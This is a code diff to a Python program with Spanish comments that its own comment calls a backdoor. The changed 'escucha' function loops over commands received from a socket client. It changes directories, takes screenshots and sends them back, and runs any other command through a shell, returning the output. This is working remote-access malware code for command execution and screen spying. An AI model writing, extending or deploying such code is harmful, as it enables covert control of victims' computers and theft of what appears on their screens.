@@ -50,28 +50,29 @@ def IPV4():
 def escucha(cliente):
     'interpreta los comandos recibidos'
     try:
-        señal = cliente.recv(1024).decode()
-        if re.match('cd ',señal.lower()):
-            ruta = señal[2:].strip()
-            try:
-                os.chdir(ruta.strip())
+        while True:
+            señal = cliente.recv(1024).decode()
+            if re.match('cd ',señal.lower()):
+                ruta = señal[2:].strip()
+                try:
+                    os.chdir(ruta.strip())
 
-                cliente.send(f'\n[!] nueva ruta>> {ruta}\n'.encode())
-            except Exception as e:
-                cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
-        elif señal == 'ss':
+                    cliente.send(f'\n[!] nueva ruta>> {ruta}\n'.encode())
+                except Exception as e:
+                    cliente.send(f'\n[!] error cambiando el directorio de trabajo:\n{e}\n'.encode())
+            elif señal == 'ss':
+                
+                try:
+                    byte = capturar_pant()
+                    cliente.sendall(len(byte).to_bytes(length=8,byteorder="big")) # tamaño de img : int a bytes , debe coincidir del otro lado
+                    cliente.send(byte) # envia la imagen en bytes
+
+                except: cliente.sendall('fallo al enviar imagen'.encode())
             
-            try:
-                byte = capturar_pant()
-                cliente.sendall(len(byte).to_bytes(length=8,byteorder="big")) # tamaño de img : int a bytes , debe coincidir del otro lado
-                cliente.send(byte) # envia la imagen en bytes
 
-            except: cliente.sendall('fallo al enviar imagen'.encode())
-            
-
-        else:
-            comando = subprocess.check_output(señal.split(' '),text=True,shell=True) # comando recibido por el cliente
-            cliente.send(comando.encode()) # envio de la salida del backdoor al cliente
+            else:
+                comando = subprocess.check_output(señal.split(' '),text=True,shell=True) # comando recibido por el cliente
+                cliente.send(comando.encode()) # envio de la salida del backdoor al cliente
     except ConnectionResetError:
         main()
     except:
